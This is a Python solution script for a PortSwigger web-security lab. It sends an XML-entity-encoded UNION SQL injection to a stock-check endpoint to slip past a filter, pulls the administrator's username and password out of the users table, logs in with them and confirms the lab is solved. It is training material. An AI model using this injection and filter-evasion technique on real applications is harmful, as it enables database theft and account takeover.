#!/usr/bin/env python3
# SQL injection with filter bypass via XML encoding
# Lab-Link: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(client, url):
    text = client.get(url).text
    soup = BeautifulSoup(text, 'html.parser')
    try:
        token = soup.find('input', attrs={'name': 'csrf'})['value']
        key = client.cookies.get('csrfKey')
    except TypeError:
        return None, None

    return token, key


def login(client, host, username, password):
    url = f'{host}/login'
    token, key = get_csrf_token(client, url)
    data = {'csrf': token,
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def get_admin_credentials(client, host):
    url = f'{host}/product/stock'
    injection = '&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#124;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;'
    data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{injection}</storeId></stockCheck>'

    text = client.post(url, data=data).text
    if 'administrator' not in text:
        print(f'[-] Failed to inject SQL statement')
        return None

    for line in text.split('\n'):
        if 'administrator' in line:
            return line.split("|")

    return None


def main():
    print('[+] SQL injection with filter bypass via XML encoding')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        admin_credentials = get_admin_credentials(client, host)
        if not admin_credentials:
            print(f'[-] Failed to obtain admin credentials')
            sys.exit(-2)
        print(f'[+] Obtained admin credentials: {admin_credentials}')

        if not login(client, host, admin_credentials[0], admin_credentials[1]):
            print(f'[-] Failed to login with admin credentials')
            sys.exit(-3)
        print(f'[+] Logged in with admin credentials, checking success')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
